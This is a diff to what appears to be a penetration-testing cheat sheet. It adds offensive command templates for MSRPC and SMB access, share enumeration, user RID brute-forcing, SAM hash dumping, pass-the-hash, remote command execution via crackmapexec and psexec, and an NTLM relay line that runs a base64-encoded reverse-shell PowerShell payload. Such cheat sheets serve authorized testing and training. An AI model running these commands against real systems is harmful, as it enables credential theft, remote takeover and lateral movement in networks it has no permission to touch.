@@ -305,7 +305,8 @@ $ rpcinfo -p <IP address>
 - MSRPC (port 135)
 
 ```
-$ wmiexec.py <user>:"<password>"@<IP address> "<command>"	
+$ wmiexec.py <user>:'<password>'@<IP address> "<command>"
+$ wmiexec.py <domain>/<username>:'<password>'@<IP address>
 ```
 
 - SMB (port 137/139/445)
@@ -319,6 +320,8 @@ $ smbclient \\\\<IP address>\\c$ -U <username>
 $ smbclient //<IP address>/<share> -k -c ls -no-pass
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
+$ smbmap -H <IP address> -u <username> -p <password> -d <domain>
+$ smbmap -H <IP address> -u <username> -p <password> -d <domain> -R SYSVOL --dir-only
 $ smbmap -H <IP address> -r <share name>
 $ smbmap -H <IP address> --download "<share name>\file.txt"
 $ smbmap -H <IP address> --upload test.txt "<share name>\file.txt"
@@ -327,6 +330,7 @@ smb: \> !ls
 $ rpcclient -U "" <IP address>
 rpcclient $> querydominfo
 rpcclient $> enumdomusers
+rpcclient $> queryuser 0x457
 $ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
 $ samrdump.py <IP address>	
 msf> use auxiliary/scanner/smb/smb_version
@@ -348,10 +352,14 @@ $ crackmapexec smb <IP address> -u <username> -p '<password>' -x 'whoami' --exec
 $ crackmapexec smb <IP address> -u <username> -p '<password>' -X 'Get-Process' --exec-method smbexec
 $ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-users
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --users
+$ crackmapexec smb <IP address> -u <username> -p '<password>' --groups
+$ crackmapexec smb <IP address> -u <username> -p '<password>' --shares
+$ crackmapexec smb <IP address> -u <username> -p '<password>' -M spider_plus --share <share name>
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --pass-pol
 $ crackmapexec smb <IP address> -u <username> -H <hash>
 $ impacket-psexec <username>:'<password>'@<IP address>
+$ psexec.py <domain>/<username>:'<password>'@<IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>        # Ensure SMB = Off in /etc/responder/Responder.conf, and 
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
 C:\> net use n: \\<IP address>\<share name>
@@ -948,8 +956,9 @@ C:\> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.1
 - PsExec
 
 ```
-$ python psexec.py <username>:<password>@<IP address>
+$ python psexec.py <username>:'<password>'@<IP address>
 $ python psexec.py <username>@<IP address>
+$ python psexec.py <domain>/<username>:'<password>'@<IP address>
 ```
 
 - Runas
